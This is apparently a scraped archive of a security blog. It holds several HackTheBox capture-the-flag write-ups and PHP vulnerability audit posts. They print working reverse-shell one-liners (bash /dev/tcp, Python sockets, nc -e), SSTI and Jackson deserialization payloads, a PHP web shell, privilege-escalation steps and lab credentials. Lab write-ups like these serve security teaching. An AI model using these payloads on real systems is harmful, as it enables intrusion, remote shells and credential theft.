youâ€™re unsure about something in web, didnt see anything special. Move to register.php, we found something juicy here. Thereâ€™s a roleid parameter Register 2 account with different roleid However both account seems similar, it didnt login into the username I register, instead login as egre55 Tried gobuster, and we found a admin.php With the roleid=1 account, manage to find a new subdomain dev-staging-01.academy.htb add it into /etc/hosts Manage to interprate the site is running on PHP laravel framework Perform searchsploit we found a potential metasploitable CVE, it needs APP_KEY set VHOST dev-staging-01.academy.htbset APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=set rhosts academy.htbset lhost 10.10.14.2 And we got the www-data After searching around, found one password in /var/www/html/academy/.env APP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_DEBUG=falseAPP_URL=http://localhostLOG_CHANNEL=stackDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!!......... By looking at the /home directory, we have total of 6 user www-data@academy:/home$ lsls21y4d ch4p cry0l1t3 egre55 g0blin mrb3n With trial and error, we manage to su as cry0l1t3 or you can just SSH in to get a proper shell $ iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm) Found cry0l1ts is in adm group. With a bit of google adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in &#x2F;var&#x2F;log, and can use xconsole. Historically, &#x2F;var&#x2F;log was &#x2F;usr&#x2F;adm (and later &#x2F;var&#x2F;adm), thus the name of the group. admin: The admin group is used to grant sudo access on ubuntu 11.10 and earlier Tons of log event are recorded, with help of some kind soul. manage to find the right one type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A Decode the hex character and we got mrb3n_Ac@d3my! Again trial and error we are able login to mrb3n perform sudo -l $ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composer Search gtfobin and we got a easy root.","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"}]},{"title":"HTB Time Writeup","slug":"HTB-Time","date":"2020-11-07T00:00:00.000Z","updated":"2023-11-30T10:17:47.858Z","comments":true,"path":"2020/11/07/HTB-Time/","permalink":"https://ik0nw.github.io/2020/11/07/HTB-Time/","excerpt":"","text":"NmapStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08Nmap scan report for 10.10.10.214Host is up (0.0074s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Online JSON parserService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds Start to enumerate at the http port Not able to find other directory other than the index page Guess this is the only route to user Tried different input Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#x27;test&#x27;: was expecting &#x27;null&#x27;, &#x27;true&#x27;, &#x27;false&#x27; or NaN Found some error message. After googling, with the keyword fasterxml and jackson we found this CVE Create a inject.sql with bash reverse shell CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; String[] command = &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;CALL SHELLEXEC(&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#x27;) Start a python server python -m SimpleHTTPServer 8000 Also start a listner nc -nvlp 8080 Finally our payload [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://x.x.x.x/inject.sql&#x27;&quot;&#125;] â€‹ And we got our reverse shell back Privilege escalationAfter some enumeration manage to find something interesting using PSPY64 &#x2F;usr&#x2F;bin&#x2F;timer_backup.sh is run by Root -rwxrw-rw- 1 pericles pericles 88 Nov 7 12:50 /usr/bin/timer_backup.sh We have write permission. echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1&quot; &gt;&gt; /usr/bin/timer_backup.sh and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH listening on [any] 5555 ...connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944bash: cannot set terminal process group (230926): Inappropriate ioctl for devicebash: no job control in this shellroot@time:/# whoami &amp;&amp; id &amp;&amp; hostnamewhoami &amp;&amp; id &amp;&amp; hostnamerootuid=0(root) gid=0(root) groups=0(root)timeroot@time:/# exit","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"HTB Doctor Writeup","slug":"HTB-Doctor","date":"2020-10-06T00:00:00.000Z","updated":"2023-11-29T13:14:44.109Z","comments":true,"path":"2020/10/06/HTB-Doctor/","permalink":"https://ik0nw.github.io/2020/10/06/HTB-Doctor/","excerpt":"","text":"Author IkonwNmap# Nmap 7.80 scan initiated Sun Sep 27 09:39:47 2020 as: nmap -Pn -sCV -p22,80,8089 -oN nmap/Full_10.129.11.0.nmap 10.129.11.0Nmap scan report for doctor.htb (10.129.11.0)Host is up (0.25s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Doctor8089/tcp open ssl/http Splunkd httpd| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Splunkd|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2020-09-06T15:57:27|_Not valid after: 2023-09-06T15:57:27Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Start enumeration on port 80, found the info@doctors.htb email. Letâ€™s add the hostname doctors.htb to /etc/hosts After adding to host file, visit doctors.htb come to a login page Tried to use info@doctors.htb to login, with the reset password function, we can verify that info@doctors.htb is not a valid account. Once we register, thereâ€™s only one function. From the page source, we found /archive but it appears to be blank page The New Post is vulnerable to server site template injection Server Side Template Injection Payloads When we input &#123;&#123;7*7&#125;&#125; , we notice that it is shown on the /archive page. can confirmed that it is using either Twig or Jinja2 Next up, craft a malicious payload to obtain reverse connecction &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.10.14.67\\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/bash\\&quot;, \\&quot;-i\\&quot;]);&#x27;&quot;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125; Another way would be using malicious curl command, this seems the unintended way &lt;img src=http://10.10.14.67:1337/$(nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.14.67&#x27;$IFS&#x27;4444&#x27;)&gt; WWW-data to UserWent to /home directory we found user shaun Found user password in /var/log/apache/backup And we can switch to user shaun. Using the privilege escalation suggester we got the splunk is vulnerable. By using the https://github.com/cnotin/SplunkWhisperer2 we are able to get privilegesâ€™ to root Initial foothold is more annoying, from www-data to user to root is easy","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"}]},{"title":"PHP::in_array() Type Juggling","slug":"PHP-audit-lab day3","date":"2020-09-25T00:00:00.000Z","updated":"2021-01-11T15:56:11.728Z","comments":true,"path":"2020/09/25/PHP-audit-lab day3/","permalink":"https://ik0nw.github.io/2020/09/25/PHP-audit-lab%20day3/","excerpt":"","text":"&lt;?phpfunction __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&#x27;c&#x27;];$data = $_GET[&#x27;d&#x27;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data); $controller-&gt;render();&#125; else &#123; echo &#x27;There is no page with this name&#x27;;&#125;class HomeController &#123; private $data; public function __construct($data) &#123; $this-&gt;data = $data; &#125; public function render() &#123; if ($this-&gt;data[&#x27;new&#x27;]) &#123; echo &#x27;controller rendering new response&#x27;; &#125; else &#123; echo &#x27;controller rendering old response&#x27;; &#125; &#125;&#125;?&gt; First vulnerability in line 9, according to PHP manual. #class_exists class_exists - This function checks whether or not the given class has been definded class_exists ( string $class_name, bool $autoload &#x3D; true) : bool ##Parameter class_name The class name. THe name is matched in a case-insensitive manner. auto_load Whether or not to call __autoload by default In this case, the class_exists function will check if the controller name we pass in is a valid, but it will first have to called the autoload function making sure all the function is loaded. When this happens, it actually includes the unknown $classname parameter we passed in.","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"}]},{"title":"PHP::in_array() Type Juggling","slug":"PHP^%^%in_array()-Type Juggling","date":"2020-09-25T00:00:00.000Z","updated":"2020-09-25T10:07:41.394Z","comments":true,"path":"2020/09/25/PHP^%^%in_array()-Type Juggling/","permalink":"https://ik0nw.github.io/2020/09/25/PHP^%^%in_array()-Type%20Juggling/","excerpt":"PHP often known as a â€˜loosely typedâ€™ programming language","text":"PHP often known as a â€˜loosely typedâ€™ programming language If we recall in PHP, no data types in any variable have to define. In the circumstance of comparisons of different variable, PHP will automatically convert the data into same data type. For example, if we want to compare integer to string. PHP will convert string to integer.Letâ€™s assume a situation. We have a input field asking for the number of bottle. &lt;?phpif(isset($_GET[&#x27;num_bottles&#x27;]))&#123; $num_bottles = $_GET[&#x27;num_bottles&#x27;]; if($num_bottles == 0)&#123; echo &quot;You have order 0 bottles\\n&quot;; &#125; if($num_bottles == 1)&#123; echo &quot;You have order 1 bottles\\n&quot;; &#125; if($num_bottles == 2)&#123; echo &quot;You have order 2 bottles\\n&quot;; &#125; if(!is_numeric($num_bottles))&#123; echo &quot;Please enter only numbers\\n&quot;; &#125;&#125;else&#123; echo &quot;Input numbers&quot;;&#125;?&gt; When we try to submit 1 to num_bottles. As we say early on, when comparing string($_GET[num_bottles] will be string data type) and integer, it will auto convert strings to integer. so it match the first if statement â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/php-audit/day1]â””â”€# curl localhost:8080/test.php?num_bottles=1 You have order 1 bottles It seems nothing special that &quot;1&quot; == 1What if the user input is â€œ1bottleâ€ ? YES, PHP will treat â€œ2bottlesâ€ as 2 because of itâ€™s loosely comparison. It will abstract the leading numbers from the beginning of string and convert to integer. â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/php-audit/day1]â””â”€# curl localhost:8080/test.php?num_bottles=1bottlesYou have order 1 bottlesPlease enter only numbers â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/php-audit/day1]â””â”€# curl localhost:8080/test.php?num_bottles=2bottlesYou have order 2 bottlesPlease enter only numbers you might ask, what if there are no numbers?PHP will treat the string as 0 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/php-audit/day1]â””â”€# curl localhost:8080/test.php?num_bottles=bottlesYou have order 0 bottlesPlease enter only numbers CTF Challenge - in_array() type jugglingCTF challenge from PHP SECURITY CALENDAR class Challenge &#123; const UPLOAD_DIRECTORY = &#x27;./solutions/&#x27;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&#x27;name&#x27;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&#x27;tmp_name&#x27;], self::UPLOAD_DIRECTORY . $this-&gt;file[&#x27;name&#x27;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&#x27;solution&#x27;]); The have to bypass the restriction of white listing check with the function in_array() Description in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] ) : bool Searches for needle in haystack using loose comparison unless strict is set. Parametersneddle &#x3D; The Searched Value haystack &#x3D; The array. strictIf the third parameter strict is set to TRUE then the in_array() function will also check the types of the needle in the haystack. How in_array() is by comparing a needle to every values in an array. When strict is not set to TRUE, it will not restrict in data types. Thatâ€™s when PHP loosely comparison come into play. if we want to upload a malicious PHP files, the filename has to be end with .php but with the restricted white list, we are only allow to send file in the range of 1 - 24. We can easily construct a file with leading numbers, will bypass the in_array() check EnvironmentDocker for convenient docker run --name app8 -d -p 8080:80 -v $(pwd):/var/www/app romeoz/docker-apache-php:7.0 A simple file for uploading &lt;!doctype html&gt;&lt;html&gt;&lt;body&gt; &lt;form action=&quot;day1.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; name the malicious file as 1malicious.php will bypass the restriction CVE exampleTBD","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"}]},{"title":"PHP::Preg_replace() RCE","slug":"PHP^%^%Preg_replace()-RCE","date":"2020-09-23T00:00:00.000Z","updated":"2023-12-11T06:31:51.248Z","comments":true,"path":"2020/09/23/PHP^%^%Preg_replace()-RCE/","permalink":"https://ik0nw.github.io/2020/09/23/PHP^%^%Preg_replace()-RCE/","excerpt":"PHP dangerous function preg_replace() leads to remote code execution with improper implementation","text":"PHP dangerous function preg_replace() leads to remote code execution with improper implementation Preg_replacepreg_replace â€” Perform a regular expression search and replace Description preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] ) : mixed EnvironmentAll the testing will be test under docker environment with php version 5.3 docker run --name app -d -p 8080:80 -v $(pwd):/var/www/app romeoz/docker-apache-php:5.3 put all your php files under the same directory with the docker file. Access the page in localhost port 8080 Startpreg_replace(patterns, replacements, input, limit, count) Searches subject for matches to pattern and replaces them with replacement. The normal use of Preg_replace() is safe enough for replacing pattern using regex Let see a example: When we want to filter unwanted words from user input and replace it with proper words &lt;?php $input = &quot;eat my shit please&quot;; if(isset($_GET[&#x27;pattern&#x27;]) &amp;&amp; isset($_GET[&#x27;replacement&#x27;]))&#123; $pattern = $_GET[&#x27;pattern&#x27;]; $replacement = $_GET[&#x27;replacement&#x27;]; echo preg_replace($pattern,$replacement,$input); &#125;else&#123; echo $input; &#125;?&gt; The /i modifier will match both upper and lower case letters. we expect the output to be eat my shit please without any parameter But what if we want to change the shit to poo instead ? And we filter off bad words. Everything seems fine with this function The danger comes in when the modifier set to /e instead of /i, it will cause PHP to execute the replacement value as code. the preg_replace() has come preg_replace(&#39;/shit/e&#39;,&#39;system(&#39;whoami&#39;),&quot;eat my shit please&quot;) The string shit trigger the replace function to execute a system(&#39;whoami&#39;) Null byte bypassLetâ€™s look at the another example if we are not able to control the delimiter &lt;?php $input = &quot;eat my shit please&quot;; if(isset($_GET[&#x27;pattern&#x27;]) &amp;&amp; isset($_GET[&#x27;replacement&#x27;]))&#123; $pattern = $_GET[&#x27;pattern&#x27;]; $replacement = $_GET[&#x27;replacement&#x27;]; echo preg_replace($pattern,$replacement,$input); &#125;else&#123; echo $input; &#125;?&gt; pattern parameter no longer require the / and delimiter This code seems safe, attacker can no longer end the regular expression with their own modifier. Do take note PHP take some of the syntax from C . In C, it handles strings as a character array, it needs a way to define the last character of the string. This is done using a null byte. A null byte is denoted by \\0 in C. preg_replace function handle an input string as they handled by C. Therefore, we can input a \\0 which is %00 in URL to control the last character of the string. CTF challengeCTF challenge from PHP SECURITY CALENDAR header(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\\n&quot;;&#125; We can use PHPâ€™s curly syntax to inject the function call Complex (curly) syntax http://localhost:8080/challenges.php/?\\S*=&#123;$&#123;system(id)&#125;&#125; The reason why we are using curly syntax is because after the function complexStrtolower we are storing our result into &quot;&lt;result&gt;&quot; in double quotes In PHP, the variable in double quotes are allow to parse as variable. In curly syntax, single curly braces is for parsing variable. // Works, outputs: This is fantasticecho &quot;This is &#123;$great&#125;&quot;; Note: Functions, method calls, static class variables, and class constants inside &#123;$&#125; work since PHP 5. However, the value accessed will be interpreted as the name of a variable in the scope in which the string is defined. Using single curly braces (&#123;&#125;) will not work for accessing the return values of functions or methods or the values of class constants or static class variables. For functions we have to use double curly braces. E.g. &#123;$&#123;phpinfo()&#125;&#125; Another questionwhy we are able to execute system(id) without quote the &#39;id&#39; if we add id in single quotes, it will auto add a slash to escape the single quotes (Which I have no idea ??? Comment if you know the reason) however, in PHP. Constants without quote will assume as string beacuse of the PHP â€˜loosely typedâ€™ characterstic (Will be discover more on later post PHP type juggling) &lt;?phpecho system(whoami);?&gt; reference https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/ https://xz.aliyun.com/t/2557 http://www.madirish.net/402","categories":[{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"}],"tags":[{"name":"PHP,preg_replace()","slug":"PHP-preg-replace","permalink":"https://ik0nw.github.io/tags/PHP-preg-replace/"}]},{"title":"HTB Compromised Writeup","slug":"HTB-Compromised","date":"2020-09-16T23:28:25.000Z","updated":"2021-10-10T03:29:41.591Z","comments":true,"path":"2020/09/17/HTB-Compromised/","permalink":"https://ik0nw.github.io/2020/09/17/HTB-Compromised/","excerpt":"","text":"Author: IkonwNmap Scan:# Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207Nmap scan report for 10.10.10.207Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)| 256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)|_ 256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Legitimate Rubber Ducks | Online Store|_Requested resource was http://10.10.10.207/shop/en/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds Port 80 webserver was a online store As usual, launch gobuster enumerate potential directories Found a backup directory, I believe itâ€™s the source code for the web search for the keyword username to look for potential plaintext username or hard coded password grep -R &#x27;username|password&#x27; |grep -v &#x27;jquery&#x27; and we found login.php have suspicious file_put_contents if (!empty(user::$data[&#x27;id&#x27;])) notices::add(&#x27;notice&#x27;, language::translate(&#x27;text_already_logged_in&#x27;, &#x27;You are already logged in&#x27;));if (isset($_POST[&#x27;login&#x27;])) &#123; //file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#x27;username&#x27;] . &quot; Passwd: &quot; . $_POST[&#x27;password&#x27;]); user::login($_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;], $redirect_url, isset($_POST[&#x27;remember_me&#x27;]) ? $_POST[&#x27;remember_me&#x27;] : false);&#125; Navigate to the location and we got the user and passwd admin:theNextGenSt0r3!~ Login to the authentication portal, we got the LiteCart version number And yeah, we got the poc --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------LiteCart 2.1.2 - Arbitrary File Upload | php/webapps/45267.py--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- The initial exploit was not able to work, it was able to create a php file, but system seems disable. Tried different shell execution function like shell_exec didnt work either. &lt;?php if( isset( $_REQUEST[&#x27;c&#x27;] ) ) &#123; system( $_REQUEST[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125; ?&gt; Instead of continuing try for luck, phpinfo() will give us what function is disabled. And we got tons of function being disabled After research, found a php script able to bypass the restriction PHP 7.0-7.3 disable_functions bypass Modified the script for the pwn function pwn($_REQUEST[&#x27;c&#x27;]); Next modify the litecart poc f = open(&#x27;exploit.php&#x27;,&#x27;r&#x27;)data = f.read()files = &#123; &#x27;vqmod&#x27;: (rand + &quot;.php&quot;,data, &quot;application/xml&quot;), &#x27;token&#x27;:one, &#x27;upload&#x27;:(None,&quot;Upload&quot;) &#125; and we manage to gain rce After trying hard to I found it seems www-data is very restricted, only very few command able to execute. I didnt manage to get a proper reverse shell. After long enumeration root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinsysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bashmysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bashred:x:1001:1001::/home/red:/bin/false I actually found that, mysql is a user. Went back to the initial foothold, I manage to find the mysql root username and password // Database define(&#x27;DB_TYPE&#x27;, &#x27;mysql&#x27;); define(&#x27;DB_SERVER&#x27;, &#x27;localhost&#x27;); define(&#x27;DB_USERNAME&#x27;, &#x27;root&#x27;); define(&#x27;DB_PASSWORD&#x27;, &#x27;changethis&#x27;); define(&#x27;DB_DATABASE&#x27;, &#x27;ecom&#x27;); define(&#x27;DB_TABLE_PREFIX&#x27;, &#x27;lc_&#x27;); define(&#x27;DB_CONNECTION_CHARSET&#x27;, &#x27;utf8&#x27;); define(&#x27;DB_PERSISTENT_CONNECTIONS&#x27;, &#x27;false&#x27;); and we got the creds for mysql root:changethis. We can launch mysql client, execute commands to write our ssh public key to authorized_keys yeah, we manage to get code execution for user mysql mysql -u root -pchangethis -e &quot;SELECT exec_cmd(&#x27;echo sshxxxxxxxxxxx&#x27; &gt; /var/lib/mysql/.ssh/authorized_keys)&quot; One thing to note here, you have to encode the + into %2B else it will be shown as a whitespace in authorized_keys file Last login: Thu Sep 3 11:52:44 2020 from 10.10.14.2mysql@compromised:~$ and we are in using ssh. After more enumeration we found a new password 3*NLJE32I$Fe it turn up to be sysadmin â€˜s password su and we got the user.txt RootWe found a suspicious file .pam_unix.so Use ghidra to reverse it. in pam_sm_authenticate we found some backdoor string convert the unsigned-hex to char sequence and we got the password zlke~U3Env82m2- with a null behind root@compromised:~# whoami &amp;&amp; hostnamerootcompromised","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"reverse","slug":"reverse","permalink":"https://ik0nw.github.io/tags/reverse/"},{"name":"mysql exec_cmd","slug":"mysql-exec-cmd","permalink":"https://ik0nw.github.io/tags/mysql-exec-cmd/"}]},{"title":"HTB::Challenge [Mobile] Cat","slug":"Challenge-Cat","date":"2020-09-10T21:38:37.000Z","updated":"2020-09-20T06:44:15.280Z","comments":true,"path":"2020/09/11/Challenge-Cat/","permalink":"https://ik0nw.github.io/2020/09/11/Challenge-Cat/","excerpt":"","text":"After extracting the file from zip, we got a Andriod Backup Upon google, we found a way to extract the file ( printf &quot;\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00&quot; ; tail -c +25 backup.ab ) | tar xfvz - and we got 2 folders apps and shared and we found this picture, the flag is at the bottom of the paper HTB{ThisBackupIsUnprotected}","categories":[{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"mobile","slug":"hackthebox-challenge/mobile","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/mobile/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Passage Writeup","slug":"HTB-Passage","date":"2020-09-05T21:22:53.000Z","updated":"2021-10-10T03:29:44.531Z","comments":true,"path":"2020/09/06/HTB-Passage/","permalink":"https://ik0nw.github.io/2020/09/06/HTB-Passage/","excerpt":"","text":"Nmap Scan# Nmap 7.80 scan initiated Sun Sep 6 12:17:03 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.129.5.22.nmap 10.129.5.22Nmap scan report for 10.129.5.22Host is up (0.26s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)| 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Passage NewsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Sep 6 12:17:20 2020 -- 1 IP address (1 host up) scanned in 16.72 seconds We found the site has implement fail2ban, which it will block certain IP address if it touches the threshold, gobuster might not work here. http://www.passage.htb/cutenews Version CuteVews 2.1.2 , rating more towards CVE Use searchsploit â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.129.5.22/nmap]â””â”€# searchsploit cutenews | grep 2.1.2CuteNews 2.1.2 - &#x27;avatar&#x27; Remote Code Execution (Metasploit) | php/remote/46698.rbCuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txtCuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt Found Metasploit module, msfconsole was not able to search the module, therefore we have to add it manually. cp 46698.rb /usr/share/metasploit-framework/modules/exploits/linux/http/46698.rb and we will have error saying out file unable to load. Because thereâ€™s some error in this ruby file (Why offsec would keep bad module ?) 